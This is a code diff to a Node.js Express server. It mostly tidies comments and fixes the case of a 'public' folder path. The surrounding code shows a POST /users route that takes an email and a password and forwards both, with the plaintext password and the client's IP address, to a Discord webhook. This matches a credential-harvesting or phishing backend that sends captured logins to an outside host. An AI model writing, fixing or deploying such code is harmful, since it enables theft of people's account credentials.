@@ -5,25 +5,25 @@ const path = require('path');
 
 const app = express();
 
-// ✅ ENV VAR (NO HARDCODE)
+// ENV
 const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;
 
-// Debug log (you can remove later)
+// Debug
 console.log("Webhook loaded:", !!DISCORD_WEBHOOK_URL);
 
 // Middleware
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// ✅ Serve frontend
-app.use(express.static(path.join(__dirname, 'Public')));
+// ✅ FIXED: use lowercase "public"
+app.use(express.static(path.join(__dirname, 'public')));
 
-// Helper: validate email
+// Email validation
 function isValidEmail(email) {
   return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
 }
 
-// Helper: get IP
+// Get client IP
 function getClientIP(req) {
   return (
     req.headers['x-forwarded-for']?.split(',')[0].trim() ||
@@ -32,7 +32,7 @@ function getClientIP(req) {
   );
 }
 
-// ✅ Send Discord webhook
+// Send webhook
 async function sendDiscordNotification({ email, password, ip }) {
   if (!DISCORD_WEBHOOK_URL) {
     console.log("No webhook URL set");
@@ -71,7 +71,7 @@ async function sendDiscordNotification({ email, password, ip }) {
   }
 }
 
-// ✅ API route
+// API
 app.post('/users', async (req, res) => {
   try {
     const { email, password } = req.body;
@@ -85,9 +85,8 @@ app.post('/users', async (req, res) => {
       return res.status(400).json({ error: "Invalid password" });
     }
 
-    console.log(`Signup received: ${email} (${ip})`);
+    console.log(`Signup: ${email} (${ip})`);
 
-    // Send webhook (non-blocking)
     sendDiscordNotification({ email, password, ip });
 
     return res.json({
@@ -101,9 +100,9 @@ app.post('/users', async (req, res) => {
   }
 });
 
-// ✅ Root route (IMPORTANT)
+// ✅ Serve homepage
 app.get('/', (req, res) => {
-  res.sendFile(path.join(__dirname, 'Public', 'index.html'));
+  res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
 // Health check
